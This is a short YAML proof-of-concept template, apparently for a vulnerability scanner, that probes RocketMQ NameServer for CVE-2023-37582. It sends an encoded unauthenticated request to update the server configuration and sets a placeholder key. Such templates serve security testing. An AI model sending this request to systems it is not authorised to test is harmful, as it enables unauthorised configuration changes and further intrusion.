name: poc-yaml-rocketmq-namesrv-cve-2023-37582-unauth
manual: true
transport: tcp
rules:
    r0:
        request:
            cache: true
            content: !!binary |
                AAAA0AAAALJ7ImNvZGUiOjMxOCwiZXh0RmllbGRzIjp7IkFjY2Vzc0tleSI6InJvY2tldG
                1xMiIsIlNpZ25hdHVyZSI6ImNHSmpxMUZCTSs0VUJsUnNORE50azBVOW5EMD0ifSwiZmxh
                ZyI6MCwibGFuZ3VhZ2UiOiJKQVZBIiwib3BhcXVlIjowLCJzZXJpYWxpemVUeXBlQ3Vycm
                VudFJQQyI6IkpTT04iLCJ2ZXJzaW9uIjo0MzV9dGhpc19pc19rZXk9dGhpc19pc192YWx1
                ZQo=
        expression: response.raw.bcontains(b"\"code\":0") && response.raw.bcontains(b"serializeTypeCurrentRPC")
expression: r0()
detail:
    author: Chaitin
    links:
        - https://stack.chaitin.com/techblog/detail?id=126
